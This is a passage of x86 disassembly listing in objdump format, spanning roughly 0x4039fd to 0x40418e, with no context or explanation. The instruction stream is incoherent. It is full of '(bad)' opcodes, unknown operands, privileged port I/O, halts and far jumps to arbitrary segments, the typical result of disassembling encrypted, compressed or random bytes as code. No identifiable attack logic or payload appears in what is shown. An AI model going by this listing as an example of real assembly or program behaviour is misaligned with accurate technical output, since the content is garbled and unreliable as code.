  4039fd:	xchg   DWORD PTR [ebp-0x4ce044fe],esi
  403a03:	outs   dx,BYTE PTR ds:[esi]
  403a04:	sahf   
  403a05:	or     esi,DWORD PTR ds:[eax]
  403a08:	fldenv [edi+ecx*4]
  403a0b:	push   edx
  403a0c:	shl    al,cl
  403a0e:	test   DWORD PTR [eax+eiz*4],ebp
  403a11:	out    0xc6,al
  403a13:	sbb    dl,BYTE PTR [ebp+0x7b]
  403a16:	daa    
  403a17:	mov    WORD PTR [ecx],ss
  403a19:	push   eax
  403a1a:	retf   0x52c9
  403a1d:	pop    ecx
  403a1e:	pop    ss
  403a1f:	cmp    BYTE PTR [ebp+0x1f],ah
  403a22:	pop    esi
  403a23:	xchg   edx,eax
  403a24:	je     0x4039ac
  403a26:	xor    esi,ebx
  403a28:	rcr    DWORD PTR [eax-0x5fba55bc],cl
  403a2e:	push   es
  403a2f:	mov    ecx,0xa2d4f843
  403a34:	adc    DWORD PTR [ebx+ebp*4-0x5eaed2a6],eax
  403a3b:	xchg   ecx,eax
  403a3c:	inc    BYTE PTR [esi-0x7d6f242d]
  403a42:	mov    DWORD PTR [eax+0x45884df5],ebx
  403a48:	rcr    ah,0xe8
  403a4b:	dec    edx
  403a4c:	(bad)  [ecx-0x40]
  403a4f:	xchg   esp,eax
  403a50:	mov    ecx,0x89111795
  403a55:	ror    DWORD PTR [ecx-0x2b585b4d],1
  403a5b:	mov    bh,0xc
  403a5d:	mov    bh,0x94
  403a5f:	xor    BYTE PTR [esi+0x54],dl
  403a62:	mov    al,0x40
  403a64:	jecxz  0x403a87
  403a66:	aam    0x80
  403a68:	lods   eax,DWORD PTR ds:[esi]
  403a69:	test   DWORD PTR [eax+0xbe5dca1],edx
  403a6f:	jmp    0x3a94:0x9d6d6174
  403a76:	int3   
  403a77:	adc    esi,ebx
  403a79:	(bad)  
  403a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a7c:	jmp    0x7998d366
  403a81:	inc    eax
  403a82:	or     al,cl
  403a84:	push   ebp
  403a85:	mov    al,0xdb
  403a87:	(bad)  
  403a88:	pop    esi
  403a89:	loopne 0x403af8
  403a8b:	inc    ecx
  403a8c:	jecxz  0x403a39
  403a8e:	jg     0x403af8
  403a90:	test   al,0x36
  403a92:	xor    dh,BYTE PTR [ebx+0xea2384e]
  403a98:	mov    ax,ss:0x94bc65e0
  403a9f:	cmp    bl,ah
  403aa1:	mov    ch,0x55
  403aa3:	stos   BYTE PTR es:[edi],al
  403aa4:	and    BYTE PTR [eax+esi*1],dl
  403aa7:	fiadd  WORD PTR [edx+eiz*2]
  403aaa:	std    
  403aab:	jbe    0x403ae1
  403aad:	js     0x403afb
  403aaf:	scas   eax,DWORD PTR es:[edi]
  403ab0:	cs fs xchg ah,al
  403ab4:	neg    DWORD PTR [eax-0x7b0657b8]
  403aba:	(bad)  
  403abb:	out    0x7d,al
  403abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403abe:	push   ebp
  403abf:	leave  
  403ac0:	ror    DWORD PTR [ebp+eiz*8+0x2d],cl
  403ac4:	push   es
  403ac5:	iret   
  403ac6:	pop    ecx
  403ac7:	xor    DWORD PTR [ecx+0x72],ebx
  403aca:	sbb    eax,DWORD PTR ds:0x78c0dea4
  403ad0:	mov    eax,ds:0xd6454010
  403ad5:	(bad)  
  403ad7:	mov    dh,BYTE PTR [edx+0x0]
  403ada:	hlt    
  403adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403add:	jecxz  0x403a74
  403adf:	lods   eax,DWORD PTR ds:[esi]
  403ae0:	div    BYTE PTR [ebp+0x12]
  403ae3:	xchg   ecx,eax
  403ae4:	gs inc edx
  403ae6:	leave  
  403ae7:	or     dl,ch
  403ae9:	pusha  
  403aea:	jne    0x403b50
  403aec:	(bad)  
  403aed:	test   eax,0xbdd47961
  403af2:	inc    ebp
  403af3:	call   DWORD PTR [ebx+0x3988f712]
  403af9:	mov    bl,BYTE PTR [eax]
  403afb:	dec    esp
  403afc:	outs   dx,BYTE PTR ds:[esi]
  403afd:	pushf  
  403afe:	inc    edi
  403aff:	hlt    
  403b00:	sbb    DWORD PTR [ecx],eax
  403b02:	ror    BYTE PTR [ecx],cl
  403b04:	mov    ds:0xcf641843,eax
  403b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b0a:	adc    esp,esp
  403b0c:	or     eax,0xe768fdf2
  403b11:	inc    ebx
  403b12:	add    eax,0x306436e3
  403b17:	mov    fs,WORD PTR [esp+edi*2-0x5b]
  403b1b:	fidivr WORD PTR [ebx]
  403b1d:	mov    ebx,0xa925e17a
  403b22:	mov    cl,0x77
  403b24:	ds mov ebp,0xd7efc9f7
  403b2a:	(bad)  
  403b2b:	dec    esi
  403b2c:	or     ch,BYTE PTR [ecx-0xa4baf15]
  403b32:	cmp    BYTE PTR [ecx],0x72
  403b35:	push   edx
  403b36:	dec    edx
  403b37:	cmp    eax,0xe49b66f6
  403b3c:	test   DWORD PTR [ebp-0x65],ebp
  403b3f:	push   ecx
  403b40:	sti    
  403b41:	jne    0x403b5a
  403b43:	inc    eax
  403b44:	xlat   BYTE PTR ds:[ebx]
  403b45:	mov    bl,0xa1
  403b47:	jne    0x403b67
  403b49:	mov    ds:0x2ee4e8a0,al
  403b4e:	aas    
  403b4f:	cld    
  403b50:	stos   DWORD PTR es:[edi],eax
  403b51:	push   ds
  403b52:	jae    0x403b68
  403b54:	jmp    0x403bc0
  403b56:	and    edx,DWORD PTR [ebp+0x2d]
  403b59:	loope  0x403bb5
  403b5b:	inc    edi
  403b5c:	ror    ebp,cl
  403b5e:	lahf   
  403b5f:	xor    eax,0xe7df4ef6
  403b64:	xor    dl,ah
  403b66:	out    0xc4,eax
  403b68:	popf   
  403b69:	push   ebx
  403b6a:	into   
  403b6b:	sbb    DWORD PTR [ecx-0x3d44e863],0x61
  403b72:	mov    edx,0x25a6d6c0
  403b77:	jnp    0x403b7e
  403b79:	xchg   ebp,eax
  403b7a:	imul   BYTE PTR [edx]
  403b7c:	data16 loop 0x403b0c
  403b7f:	pop    ds
  403b80:	scas   eax,DWORD PTR es:[edi]
  403b81:	fidivr DWORD PTR [edi]
  403b83:	clc    
  403b84:	cs push 0xffffff89
  403b87:	in     eax,dx
  403b88:	cmp    esi,DWORD PTR [esi-0x62]
  403b8b:	mov    DWORD PTR [esi+0x17],ebx
  403b8e:	in     al,0xe1
  403b90:	shl    cl,1
  403b92:	sbb    al,0xf6
  403b94:	inc    ecx
  403b95:	push   ss
  403b96:	shl    BYTE PTR [edx-0x16],1
  403b99:	rol    BYTE PTR [edx+0x324e754d],cl
  403b9f:	push   ss
  403ba0:	mov    dl,0x8f
  403ba2:	arpl   WORD PTR [ebx-0x3e],bx
  403ba5:	(bad)  
  403ba7:	cs lahf 
  403ba9:	xlat   BYTE PTR ds:[ebx]
  403baa:	das    
  403bab:	fprem  
  403bad:	shr    DWORD PTR [ebx+ebp*4],1
  403bb0:	idiv   BYTE PTR [edi-0xcb84017]
  403bb6:	or     bl,BYTE PTR [ebp+0x44]
  403bb9:	jne    0x403b73
  403bbb:	(bad)  
  403bbc:	shr    ch,1
  403bbe:	pop    DWORD PTR [eax+0x5f]
  403bc1:	sub    BYTE PTR [edx],ah
  403bc3:	shl    BYTE PTR ds:0x42355caa,cl
  403bc9:	out    0xf4,eax
  403bcb:	cld    
  403bcc:	pop    eax
  403bcd:	mov    ebp,0xd620c513
  403bd2:	inc    edi
  403bd3:	lahf   
  403bd4:	add    eax,0x7490b3fa
  403bd9:	aam    0x2
  403bdb:	push   esp
  403bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bdd:	outs   dx,BYTE PTR ds:[esi]
  403bde:	das    
  403bdf:	test   edi,edi
  403be1:	add    DWORD PTR [esi-0x62],esp
  403be4:	scas   eax,DWORD PTR es:[edi]
  403be5:	aaa    
  403be6:	cs push ecx
  403be8:	xchg   ebx,eax
  403be9:	aam    0xfe
  403beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bec:	fs dec ebx
  403bee:	test   BYTE PTR [ebp-0x6066217f],bh
  403bf4:	ror    esi,0xb1
  403bf7:	push   0xffffffb7
  403bf9:	neg    BYTE PTR [edx]
  403bfb:	popf   
  403bfc:	push   ebx
  403bfd:	jo     0x403ba0
  403bff:	or     BYTE PTR [ebp+ebx*4-0x46],dl
  403c03:	push   0xd16f7723
  403c08:	mov    ebp,0xde45e62d
  403c0d:	mov    BYTE PTR [ebp+0x5401b10d],ch
  403c13:	add    DWORD PTR [eax+0x33],esi
  403c16:	mov    ebp,DWORD PTR [eax+0x5b]
  403c19:	push   esi
  403c1a:	sbb    eax,0x85e3c90c
  403c1f:	daa    
  403c20:	in     eax,dx
  403c21:	add    dl,ch
  403c23:	lds    ebx,FWORD PTR [ebx+ebx*2+0x53e55707]
  403c2a:	imul   edi,DWORD PTR [edi-0x4b1981e8],0xffffffdb
  403c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c32:	jle    0x403c48
  403c34:	jg     0x403c15
  403c36:	(bad)  
  403c37:	ss mov ?,ebx
  403c3a:	adc    al,BYTE PTR [eax]
  403c3c:	push   es
  403c3d:	dec    ebx
  403c3e:	push   ds
  403c3f:	lahf   
  403c40:	mov    ecx,0xdcaf6c91
  403c45:	lea    esp,[ecx]
  403c47:	in     eax,dx
  403c48:	inc    edx
  403c49:	adc    al,0x74
  403c4b:	cs jo  0x403c59
  403c4e:	cli    
  403c4f:	stos   BYTE PTR es:[edi],al
  403c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c51:	sub    BYTE PTR [ebx-0x1c],ch
  403c54:	cld    
  403c55:	mov    dh,0x3e
  403c57:	jmp    0x403ca1
  403c59:	inc    ecx
  403c5a:	and    DWORD PTR [esi],edx
  403c5c:	cmp    eax,0x7a25c400
  403c61:	mov    ecx,0xa32c3983
  403c66:	clc    
  403c67:	mov    esi,0xb4f73374
  403c6c:	fstp   QWORD PTR [edi]
  403c6e:	sbb    BYTE PTR [esi],0xf4
  403c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c72:	lds    ecx,FWORD PTR [ecx]
  403c74:	fs cmp edi,edi
  403c77:	add    ch,BYTE PTR ds:0x328f09a1
  403c7d:	xor    DWORD PTR [edx-0x4e],ebp
  403c80:	fcomp  DWORD PTR ds:0xf22f515
  403c86:	mov    esi,0x1c1e7b2e
  403c8b:	(bad)  [edi]
  403c8d:	pop    eax
  403c8e:	dec    eax
  403c8f:	jmp    0xbe51ec58
  403c94:	aam    0x6e
  403c96:	ret    
  403c97:	jmp    0x403d01
  403c99:	into   
  403c9a:	adc    al,0xbb
  403c9c:	inc    DWORD PTR [ecx]
  403c9e:	adc    eax,0xac0f42e0
  403ca3:	xchg   ecx,eax
  403ca4:	mov    al,ds:0x2cf95dbc
  403ca9:	(bad)  
  403caa:	jp     0x403c84
  403cac:	nop
  403cad:	jb     0x403cbd
  403caf:	add    edx,ebx
  403cb1:	not    BYTE PTR [esi+edi*4+0x28]
  403cb5:	test   eax,0x1efd1f1
  403cba:	addr16 out 0xbd,eax
  403cbd:	push   eax
  403cbe:	imul   eax,DWORD PTR [esi+0x6f],0xdc2a0ccd
  403cc5:	enter  0x2506,0xa2
  403cc9:	arpl   WORD PTR cs:[esp+edx*1],dx
  403ccd:	retf   
  403cce:	(bad)  
  403ccf:	(bad)  
  403cd0:	addr16 pop eax
  403cd2:	mov    ah,0xd7
  403cd4:	inc    edi
  403cd5:	pop    ebx
  403cd6:	aam    0xb2
  403cd8:	sbb    eax,0xfae878ef
  403cdd:	addr16 xor al,0x16
  403ce0:	in     eax,dx
  403ce1:	scas   al,BYTE PTR es:[edi]
  403ce2:	pop    ecx
  403ce3:	jl     0x403d58
  403ce5:	mov    BYTE PTR [eax+0x3346c817],bh
  403ceb:	icebp  
  403cec:	mov    ecx,0xf1ff2981
  403cf1:	fiadd  WORD PTR [ecx+ecx*4-0x1a]
  403cf5:	cdq    
  403cf6:	dec    ebp
  403cf7:	mov    ebp,DWORD PTR ds:0xb25e59b
  403cfd:	xor    al,0xf6
  403cff:	sbb    BYTE PTR [ebp-0x12],bl
  403d02:	popa   
  403d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d04:	jge    0x403d49
  403d06:	shl    DWORD PTR [ebx-0x7050ff29],1
  403d0c:	inc    ebx
  403d0d:	inc    ecx
  403d0e:	xlat   BYTE PTR ds:[ebx]
  403d0f:	jg     0x403caf
  403d11:	fdiv   QWORD PTR [ebp-0x28]
  403d14:	rcl    BYTE PTR [ecx+0x313d0ba],0xd0
  403d1b:	hlt    
  403d1c:	pop    esp
  403d1d:	lods   al,BYTE PTR ds:[esi]
  403d1e:	aaa    
  403d1f:	mov    ah,0x4c
  403d21:	dec    esp
  403d22:	mov    eax,ds:0x66225918
  403d27:	into   
  403d28:	cs pop ecx
  403d2a:	mov    WORD PTR [esi+0x1a],?
  403d2d:	sbb    cl,BYTE PTR [ecx]
  403d2f:	cli    
  403d30:	cld    
  403d31:	xchg   DWORD PTR [esi-0x27073b54],esi
  403d37:	aaa    
  403d38:	dec    esp
  403d39:	pop    ebp
  403d3a:	jecxz  0x403cdd
  403d3c:	movntps XMMWORD PTR [edx],xmm0
  403d3f:	add    al,0xeb
  403d41:	mov    al,ds:0x5609b5e1
  403d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d47:	cli    
  403d48:	(bad)  
  403d49:	jnp    0x403d2b
  403d4b:	jmp    0x403cd6
  403d4d:	xchg   ebx,eax
  403d4e:	mov    WORD PTR gs:[ebp+0x9c73ce9],ds
  403d55:	sbb    BYTE PTR [edx],bh
  403d57:	and    dl,dl
  403d59:	mov    ebp,0x47d20656
  403d5e:	gs jecxz 0x403db4
  403d61:	es int 0xca
  403d64:	push   eax
  403d65:	jae    0x403d98
  403d67:	fst    DWORD PTR [ecx+eiz*1+0x3d28696d]
  403d6e:	push   edx
  403d6f:	cmp    ah,BYTE PTR [ebx]
  403d71:	sbb    eax,0x61dca7f1
  403d76:	in     eax,dx
  403d77:	xor    BYTE PTR [ecx+0x43],al
  403d7a:	xor    eax,0xf79a5016
  403d7f:	push   esi
  403d80:	pushf  
  403d81:	dec    ebp
  403d82:	shl    dh,cl
  403d84:	loopne 0x403d4f
  403d86:	imul   ebx,DWORD PTR [esi+0x4f],0xffffffb2
  403d8a:	dec    ebx
  403d8b:	add    DWORD PTR [edx-0x4bad972],ebx
  403d91:	xchg   edi,eax
  403d92:	push   es
  403d93:	dec    esi
  403d94:	fucomi st,st(1)
  403d96:	pop    eax
  403d97:	lods   eax,DWORD PTR ds:[esi]
  403d98:	int3   
  403d99:	arpl   WORD PTR [ebx+ebx*8+0x10],bx
  403d9d:	adc    DWORD PTR [eax+esi*1],eax
  403da0:	sub    DWORD PTR [edi],esi
  403da2:	xor    dl,BYTE PTR ds:0x1d5ffca8
  403da8:	xlat   BYTE PTR ds:[ebx]
  403da9:	mov    cl,0xef
  403dab:	and    edi,ebp
  403dad:	push   edi
  403dae:	xor    DWORD PTR [ebp-0x39],edx
  403db1:	sub    eax,0x995731e5
  403db6:	xchg   edi,eax
  403db7:	jne    0x403d8a
  403db9:	push   0xffffff90
  403dbb:	sub    ah,cl
  403dbd:	mov    ebx,0x4df7974f
  403dc2:	outs   dx,BYTE PTR ds:[esi]
  403dc3:	add    DWORD PTR [edi+0x66],ebx
  403dc6:	jle    0x403def
  403dc8:	out    0x98,eax
  403dca:	mov    eax,ds:0xe0c992fa
  403dcf:	mov    cl,0xe5
  403dd1:	mov    dl,0xee
  403dd3:	out    dx,al
  403dd4:	mov    edx,0xec934dbe
  403dd9:	imul   esi,DWORD PTR [eax],0xffffff97
  403ddc:	outs   dx,DWORD PTR ds:[esi]
  403ddd:	mov    eax,ds:0xfd07c290
  403de2:	and    BYTE PTR [eax+0x2f927ce6],bl
  403de8:	mov    ebp,0xaa4d8483
  403ded:	aaa    
  403dee:	mul    DWORD PTR [esi]
  403df0:	inc    edx
  403df1:	(bad)  [eax-0x309f3d7a]
  403df7:	xor    BYTE PTR [ebp+0x7a6bad0a],cl
  403dfd:	push   ds
  403dfe:	sahf   
  403dff:	adc    ah,BYTE PTR gs:[edx]
  403e02:	mov    al,0x26
  403e04:	sub    esi,esp
  403e06:	imul   edx,eax,0xffffffed
  403e09:	xor    al,0x8c
  403e0b:	aas    
  403e0c:	mov    ch,0x7c
  403e0e:	add    DWORD PTR [ecx],0xcb756da6
  403e14:	add    al,0x43
  403e16:	addr16 sub edx,ebp
  403e19:	(bad)  
  403e1a:	or     edi,ebp
  403e1c:	push   ds
  403e1d:	inc    edi
  403e1e:	and    bl,BYTE PTR [ebx]
  403e20:	jge    0x403e64
  403e22:	inc    eax
  403e23:	cmp    bl,bl
  403e25:	cmp    al,0xbc
  403e27:	xor    DWORD PTR [ebp-0x1bd13265],edx
  403e2d:	into   
  403e2e:	xchg   DWORD PTR [edx],eax
  403e30:	sbb    dh,0x8a
  403e33:	fild   WORD PTR [ecx+0x61d2dd44]
  403e39:	cdq    
  403e3a:	pop    esi
  403e3b:	retf   0xf2b5
  403e3e:	cdq    
  403e3f:	in     eax,dx
  403e40:	add    eax,0x91b89e35
  403e45:	div    DWORD PTR [ebx]
  403e47:	out    dx,al
  403e48:	pop    ebp
  403e49:	add    al,0xd1
  403e4b:	(bad)  
  403e4c:	enter  0xdd11,0x34
  403e50:	inc    ecx
  403e51:	cmp    BYTE PTR cs:[eax+edx*1],al
  403e55:	cmp    eax,0x102729f7
  403e5a:	popa   
  403e5b:	jecxz  0x403e58
  403e5d:	stos   BYTE PTR es:[edi],al
  403e5e:	retf   
  403e5f:	mov    bl,0xd7
  403e61:	aas    
  403e62:	pop    ebx
  403e63:	lock dec esp
  403e65:	sub    eax,0x3a07d5dc
  403e6a:	xchg   edi,eax
  403e6b:	mov    ds:0xdf5206c4,al
  403e70:	adc    ecx,edi
  403e72:	inc    BYTE PTR [ecx+0x65787208]
  403e78:	hlt    
  403e79:	loopne 0x403e01
  403e7b:	xor    eax,edi
  403e7d:	or     ebx,DWORD PTR [ecx-0x6c]
  403e80:	mov    al,BYTE PTR [edi]
  403e82:	repz mov WORD PTR [ebp+0x6e],ds
  403e86:	pop    eax
  403e87:	retf   0x2dfe
  403e8a:	inc    ecx
  403e8b:	enter  0xcb54,0xa1
  403e8f:	(bad)  
  403e90:	push   edi
  403e91:	frstor [eax+0x32]
  403e94:	push   es
  403e95:	lahf   
  403e96:	fnsave [edx+0x47fa59ef]
  403e9c:	add    DWORD PTR [ecx+ebp*2-0x6819eada],ebp
  403ea3:	enter  0xe6df,0x6b
  403ea7:	jmp    0x403f0e
  403ea9:	or     DWORD PTR ds:0x2ebe3cda,edx
  403eaf:	cs mov eax,0xf607fca8
  403eb5:	jp     0x403e5f
  403eb7:	cld    
  403eb8:	pop    esp
  403eb9:	mov    WORD PTR [ecx],?
  403ebb:	loopne 0x403e8d
  403ebd:	add    BYTE PTR [ecx+0x60ffd8b],bl
  403ec3:	mov    ah,0x91
  403ec5:	sbb    ah,ah
  403ec7:	xchg   edx,eax
  403ec8:	add    eax,0x1d4ae7db
  403ecd:	sahf   
  403ece:	pop    ebp
  403ecf:	in     al,0x4d
  403ed1:	jle    0x403e96
  403ed3:	das    
  403ed4:	lods   eax,DWORD PTR ds:[esi]
  403ed5:	adc    eax,0xcf836344
  403eda:	test   DWORD PTR [eax+0x5323b0],ecx
  403ee0:	test   al,0xf8
  403ee2:	pop    ds
  403ee3:	outs   dx,BYTE PTR ds:[esi]
  403ee4:	and    eax,0xea461214
  403ee9:	sub    DWORD PTR [esi],eax
  403eeb:	push   esp
  403eec:	test   al,0x2f
  403eee:	repnz xchg esi,eax
  403ef0:	(bad)  
  403ef1:	addr16 mov esi,0xbc89e9df
  403ef7:	(bad)  
  403ef8:	gs push ebx
  403efa:	inc    ebx
  403efb:	jle    0x403eb5
  403efd:	inc    eax
  403efe:	lds    ecx,FWORD PTR [ecx-0x7fe74aa9]
  403f04:	pop    eax
  403f05:	stc    
  403f06:	clc    
  403f07:	jno    0x403f62
  403f09:	clc    
  403f0a:	sti    
  403f0b:	xchg   BYTE PTR [ecx-0x324b4af7],al
  403f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f12:	adc    BYTE PTR ds:0x1aa866f5,ah
  403f18:	adc    bh,BYTE PTR [edx-0x64]
  403f1b:	retf   
  403f1c:	test   DWORD PTR [ebp+edx*1+0x68],edx
  403f20:	arpl   WORD PTR [eax],bp
  403f22:	mov    esi,ebx
  403f24:	in     al,dx
  403f25:	jp     0x403f64
  403f27:	cmp    dl,BYTE PTR [edx+0xba852a0]
  403f2d:	jge    0x403f2a
  403f2f:	es inc ebx
  403f31:	shr    BYTE PTR gs:[esi+0x53126a23],cl
  403f38:	pop    edi
  403f39:	mov    eax,0x29bb7dd4
  403f3e:	sub    esi,DWORD PTR [ebx+ecx*4-0x4bb2ff3f]
  403f45:	shr    BYTE PTR [ecx-0x7f],cl
  403f48:	ins    BYTE PTR es:[edi],dx
  403f49:	sbb    eax,0x428d3309
  403f4e:	pop    edi
  403f4f:	mov    edi,DWORD PTR [esi+0x1e]
  403f52:	out    0x8a,eax
  403f54:	push   cs
  403f55:	in     al,0xcc
  403f57:	push   ebp
  403f58:	cmp    al,0xa7
  403f5a:	adc    BYTE PTR [edx+ebp*2-0x16e6e0f7],cl
  403f61:	out    dx,eax
  403f62:	or     DWORD PTR [ecx-0x53],ecx
  403f65:	sub    eax,0x8cf39b0a
  403f6a:	mov    edx,0xf96f0983
  403f6f:	push   ebp
  403f70:	ret    0x5566
  403f73:	push   0xffffff90
  403f75:	lods   al,BYTE PTR ds:[esi]
  403f76:	icebp  
  403f77:	fcom   QWORD PTR [edi-0x49e0c717]
  403f7d:	jmp    0x1bdc:0xd037c134
  403f84:	in     al,0x33
  403f86:	(bad)  
  403f87:	cmp    edi,edx
  403f89:	inc    edx
  403f8a:	inc    edi
  403f8b:	xlat   BYTE PTR ds:[ebx]
  403f8c:	push   0x40e5f7d3
  403f91:	aas    
  403f92:	sub    ecx,edx
  403f94:	mov    edx,DWORD PTR [eax-0x64cbc5ca]
  403f9a:	ss ins BYTE PTR es:[edi],dx
  403f9c:	and    BYTE PTR [eax],dl
  403f9e:	retf   0x549b
  403fa1:	retf   0x7652
  403fa4:	adc    BYTE PTR ds:0x703df8ae,cl
  403faa:	mov    DWORD PTR [ebp-0x4],esp
  403fad:	mov    ah,BYTE PTR [edi-0x2d]
  403fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb1:	mov    ecx,0x8aee6bec
  403fb6:	rcr    DWORD PTR [edx-0x15],1
  403fb9:	stos   BYTE PTR es:[edi],al
  403fba:	sub    dl,dl
  403fbc:	sub    ecx,DWORD PTR [edi-0x4d]
  403fbf:	pop    es
  403fc0:	(bad)  
  403fc1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403fc3:	es pop ds
  403fc5:	repnz imul ah
  403fc8:	mov    ebx,0x91034c29
  403fcd:	xor    ebx,ebp
  403fcf:	loope  0x403f7c
  403fd1:	pop    eax
  403fd2:	iret   
  403fd3:	ret    0x616c
  403fd6:	leave  
  403fd7:	cmp    DWORD PTR [ebp+0x35c5e148],edi
  403fdd:	mov    al,0x80
  403fdf:	pop    eax
  403fe0:	mov    ebx,0x70229eee
  403fe5:	mov    ch,0x72
  403fe7:	test   al,0x19
  403fe9:	dec    ebp
  403fea:	pause  
  403fec:	les    edx,FWORD PTR [esi+0x72]
  403fef:	in     al,0xde
  403ff1:	fcos   
  403ff3:	or     BYTE PTR [ebp+0x2ea7bf8e],cl
  403ff9:	or     al,0x69
  403ffb:	mov    ebp,cs
  403ffd:	push   0x424faa70
  404002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404003:	test   DWORD PTR [eax],esp
  404005:	jne    0x404046
  404007:	call   0xd6b9:0x5b867156
  40400e:	push   eax
  40400f:	add    al,0x1
  404011:	xor    BYTE PTR [edx-0x43],ch
  404014:	inc    edi
  404015:	call   0xd6b0:0x653861ff
  40401c:	js     0x40404f
  40401e:	or     al,0x51
  404020:	hlt    
  404021:	test   BYTE PTR [edx],dh
  404023:	pop    es
  404024:	mov    ds:0xb4194088,al
  404029:	xor    eax,DWORD PTR [edi]
  40402b:	add    edx,DWORD PTR ds:0x5dfceb7b
  404031:	rcl    BYTE PTR [edx+esi*2],0xf7
  404035:	or     al,0x24
  404037:	jmp    0xa62d:0xb482f605
  40403e:	sub    eax,0xcc4b85d0
  404043:	mov    ds:0x51c80325,eax
  404048:	jp     0x404060
  40404a:	js     0x40400b
  40404c:	mov    ebx,0x8b6ce52c
  404051:	shl    BYTE PTR [eax-0x129b75b9],0xdc
  404058:	dec    edi
  404059:	scas   eax,DWORD PTR es:[edi]
  40405a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40405b:	mov    ebp,0x8d307429
  404060:	popa   
  404061:	jg     0x4040d1
  404063:	jnp    0x404097
  404065:	jge    0x404001
  404067:	jnp    0x4040cb
  404069:	icebp  
  40406a:	data16 rol BYTE PTR [esi],0xfa
  40406e:	aas    
  40406f:	sbb    eax,0xd9bce1d0
  404074:	inc    ebx
  404075:	(bad)  
  404076:	call   0xb7fb:0x7313b75f
  40407d:	dec    ebp
  40407e:	jbe    0x404013
  404080:	push   DWORD PTR [ebp-0x56682221]
  404086:	xchg   BYTE PTR [ebx-0x3dddf2fe],bl
  40408c:	jnp    0x404105
  40408e:	adc    bh,BYTE PTR [eax]
  404090:	std    
  404091:	inc    ebp
  404092:	scas   al,BYTE PTR es:[edi]
  404093:	leave  
  404094:	daa    
  404095:	mov    ebp,0x4129b7e6
  40409a:	cmc    
  40409b:	out    dx,eax
  40409c:	and    eax,0xd305e857
  4040a1:	pop    eax
  4040a2:	jmp    0xa9f2:0x9955b4d7
  4040a9:	repnz xor edi,ebp
  4040ac:	sti    
  4040ad:	xlat   BYTE PTR ds:[ebx]
  4040ae:	push   ss
  4040af:	adc    eax,0xf2c72c2f
  4040b4:	in     al,dx
  4040b5:	xor    al,0x85
  4040b7:	ja     0x404108
  4040b9:	repz lahf 
  4040bb:	je     0x404078
  4040bd:	loope  0x404138
  4040bf:	in     al,0x52
  4040c1:	aas    
  4040c2:	outs   dx,BYTE PTR ds:[esi]
  4040c3:	loope  0x4040ad
  4040c5:	cli    
  4040c6:	mov    dl,0x0
  4040c8:	(bad)  
  4040c9:	push   es
  4040ca:	cmp    BYTE PTR [esi-0x46],dl
  4040cd:	push   ss
  4040ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040cf:	mov    al,0xfb
  4040d1:	gs pop edx
  4040d3:	mov    ah,0xa2
  4040d5:	pop    esp
  4040d6:	outs   dx,DWORD PTR ds:[esi]
  4040d7:	lock std 
  4040d9:	(bad)  
  4040da:	int3   
  4040db:	sti    
  4040dc:	int3   
  4040dd:	sub    al,0x8e
  4040df:	and    al,0x34
  4040e1:	pop    ebp
  4040e2:	mov    esp,0xff5bdab0
  4040e7:	mov    ah,0x20
  4040e9:	dec    ebp
  4040ea:	call   DWORD PTR [eax-0x5f51c4ab]
  4040f0:	div    BYTE PTR [esi+0x3b]
  4040f3:	clc    
  4040f4:	loopne 0x4040ef
  4040f6:	imul   ecx,DWORD PTR [eax-0x6a30b4d],0x18
  4040fd:	or     cl,BYTE PTR [edi]
  4040ff:	mov    ds:0x77293982,eax
  404104:	imul   DWORD PTR [ebp-0x3d]
  404107:	jmp    0x40415d
  404109:	mov    ds:0xd4f21cf9,eax
  40410e:	pop    edx
  40410f:	jo     0x404190
  404111:	jae    0x40417e
  404113:	in     eax,dx
  404114:	cmp    esi,ebp
  404116:	lea    ebp,ds:0xebb3c0e4
  40411c:	jnp    0x40418e
  40411e:	imul   esi,edi,0x61d4b45e
  404124:	add    esi,DWORD PTR [edx+edx*8+0x5]
  404128:	lea    eax,[ebp-0x5f]
  40412b:	test   eax,0xcbba958e
  404130:	mov    edi,0x83f65dda
  404135:	pushf  
  404136:	xor    ebx,ebx
  404138:	dec    ebx
  404139:	aas    
  40413a:	icebp  
  40413b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413c:	add    BYTE PTR [edi],bh
  40413e:	sbb    DWORD PTR [ebx],0xffffffca
  404141:	sub    ebx,DWORD PTR [ebp-0x5627d359]
  404147:	addr16 nop
  404149:	inc    BYTE PTR [ecx-0x6c72ddca]
  40414f:	xchg   ecx,eax
  404150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404151:	xor    ecx,esi
  404153:	dec    esi
  404154:	jg     0x404106
  404156:	clc    
  404157:	into   
  404158:	jmp    DWORD PTR [ebp+0x3]
  40415b:	clc    
  40415c:	dec    ecx
  40415d:	and    BYTE PTR [ebp+0xb392d92],dh
  404163:	adc    al,0xde
  404165:	pop    ebx
  404166:	xor    al,0x36
  404168:	jae    0x40410b
  40416a:	bswap  eax
  40416c:	xchg   esi,eax
  40416d:	cmp    edi,DWORD PTR [eax]
  40416f:	neg    edi
  404171:	mov    ecx,0x7e2d836c
  404176:	rcl    ecx,0xa9
  404179:	mov    ch,bh
  40417b:	cmp    dl,BYTE PTR [eax+0x23]
  40417e:	and    edi,DWORD PTR [esi]
  404180:	pop    ecx
  404181:	push   esp
  404182:	pop    ss
  404183:	not    DWORD PTR [edx-0x3b5abc2d]
  404189:	mov    ebp,0x5d02af93
  40418e:	jnp    0x404152
